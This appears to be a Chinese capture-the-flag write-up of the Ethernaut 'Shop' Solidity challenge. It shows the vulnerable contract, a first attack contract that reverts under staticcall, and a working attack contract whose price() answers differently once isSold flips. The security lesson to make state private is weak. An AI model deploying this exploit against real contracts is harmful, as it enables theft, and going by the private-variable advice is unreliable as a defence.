# 21. Shop
### 原题
您能在商店以低于要求的价格购买到商品吗？

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

### 分析
看完合约代码，我们知道其实就要把price修改到低于100的值。\
在`buy()`的函数中，注意`IBuyer(msg.sender)`，\
`msg.sender`就是我的攻击合约地址。\
两个地方执行了我的攻击合约的`price()`。\
我们需要做两件事儿：
1. 满足条件 `_buyer.price() >= price`
2. 再次给price赋值的时候`price = _buyer.price()`要设法小于100。
发挥我们的想象，开始构造。\
有的初学的同学，可能会天真的想到，在攻击合约里放个记录价格的状态变量。\
执行一次`_buyer.price()`就改变一次状态变量。\
那好，纸上谈兵，不如实践出真知，直接上代码！\
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external ;
}

contract ShopAttack {
    uint256 public pc = 101;
    Shop public  shop;

    event PriceCalled(uint256);

    constructor(address _shop)  {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external returns (uint256) {
      // 在第一次调用时候，pc返回100
      // 再次调用，pc返回99
      // 目前来看逻辑没有问题
      pc = pc - 1;
      emit PriceCalled(pc);
      return pc;
    }

}
```
我们在remix上部署执行，但是结果却是让人失望的。\
```solidity
transact to ShopAttack.attack errored: Error occurred: revert.

revert
	The transaction has been reverted to the initial state.
Note: The called function should be payable if you send value and the value you send should be less than your current balance.
If the transaction failed for not having enough gas, try increasing the gas limit gently.
```
这是什么鬼，接口的函数签名都是正确的，按理应该没有问题。\
看看攻击合约上定义的price接口就知道，上面限定了`view`。\
有的同学会说，函数签名和`view/pure`这些没有关系，应该可以匹配到了。\
可是这里忽略了一个很重要的点,当接口限定了view，在使用接口调用函数的时候，\
EVM是用的staticCall,这是啥意思，就是说静态调用，不允许修改状态变量的。\
所以我们刚执行的时候就直接revert。\
来，我们重新改方案
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external ;
    // 通过状态来判断
    function isSold() external view returns (bool);
}

contract ShopAttack {
    
    Shop public  shop;

    constructor(address _shop)  {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
      // 第一次
      if (!shop.isSold()){
        return 100;
      } else {
        // 第二次
        return 1;
      }
    }

}
```
这样执行就大功告成了。\
又有同学会问，`isSold()`是什么，怎么可以执行呢？\
原因是public的变量，编译器会自动生成一个getter函数。\
合约外是可以通过这个函数获取到当前值。\
那如果是把public改成private，那么就没有这个函数了，我们的方案就失效了。\

### 总结
重要的状态变量，特别是需要进行重要条件判断的变量，我们最好还是设置成private。

